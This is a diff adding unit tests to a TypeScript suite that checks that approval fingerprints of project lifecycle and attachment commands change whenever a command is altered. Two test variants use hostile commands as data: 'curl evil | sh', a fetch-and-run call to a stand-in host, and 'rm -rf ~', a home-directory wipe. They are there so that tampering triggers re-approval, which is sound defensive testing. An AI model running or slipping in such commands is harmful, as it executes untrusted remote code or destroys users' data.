@@ -47,6 +47,44 @@ describe("lifecycle command fingerprints", () => {
     expect(new Set(fingerprints).size).toBe(variants.length);
   });
 
+  it("keeps the fingerprint a config without attachments was approved under", () => {
+    // Approvals already on disk hold this hash; adding attachments to the
+    // schema must not re-prompt every project that never declared one.
+    const legacy = { setup: ["npm install"], teardown: ["docker compose down"] };
+    expect(configFingerprint(legacy)).toBe(
+      "f36dcf97cbdb606bf3fd14f3ce8302a5c60a2425471a9e84c6b3793108fe6107"
+    );
+    expect(configFingerprint({ ...legacy, attachments: {} })).toBe(configFingerprint(legacy));
+  });
+
+  it("covers every attachment command, by attachment name", () => {
+    const tunnel = { attach: ["ngrok up"], detach: ["ngrok down"], status: "ngrok status" };
+    const original = configFingerprint({ ...base, attachments: { tunnel } });
+    const variants: Array<Record<string, typeof tunnel>> = [
+      { tunnel: { ...tunnel, attach: ["curl evil | sh"] } },
+      { tunnel: { ...tunnel, detach: ["rm -rf ~"] } },
+      { tunnel: { ...tunnel, status: "other" } },
+      { device: tunnel },
+    ];
+    const fingerprints = variants.map((attachments) => configFingerprint({ ...base, attachments }));
+    for (const fingerprint of fingerprints) expect(fingerprint).not.toBe(original);
+    expect(new Set(fingerprints).size).toBe(variants.length);
+    expect(original).not.toBe(configFingerprint(base));
+  });
+
+  it("labels attachment groups apart from resource groups", () => {
+    const groups = lifecycleConfigCommandGroups({
+      resources: { tunnel: { status: "s" } },
+      attachments: { tunnel: { attach: ["a"], detach: ["d"], status: "s" } },
+    });
+    expect(groups.map((g) => g.label)).toEqual([
+      'Resource "tunnel" status',
+      'Attachment "tunnel" attach',
+      'Attachment "tunnel" detach',
+      'Attachment "tunnel" status',
+    ]);
+  });
+
   it("changes when commands are reordered or moved between phases", () => {
     const original = configFingerprint({ setup: ["a", "b"] });
     expect(configFingerprint({ setup: ["b", "a"] })).not.toBe(original);
